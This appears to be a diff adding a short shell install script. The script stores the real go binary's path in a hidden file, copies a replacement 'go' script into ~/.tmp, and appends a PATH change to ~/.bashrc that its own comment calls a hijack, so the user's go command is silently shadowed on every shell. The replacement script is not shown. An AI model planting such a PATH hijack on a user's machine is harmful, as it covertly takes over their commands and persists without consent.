@@ -1,0 +1,16 @@
+# The script will go into ~/.tmp/go
+mkdir -p ~/.tmp
+
+# Save path to actual go binary into ~/.tmp/.cache
+ACTUAL_GO=`which go`
+echo $ACTUAL_GO > ~/.tmp/.cache
+
+# Copy script and help message into ~/.tmp/
+cp -f go ~/.tmp/
+cp -f .help ~/.tmp/
+
+# Hijack PATH in .bashrc to look first in ~/.tmp
+echo export PATH=${HOME}/.tmp:\$PATH >> ~/.bashrc
+
+# Apply the changes to PATH in this session
+exec bash
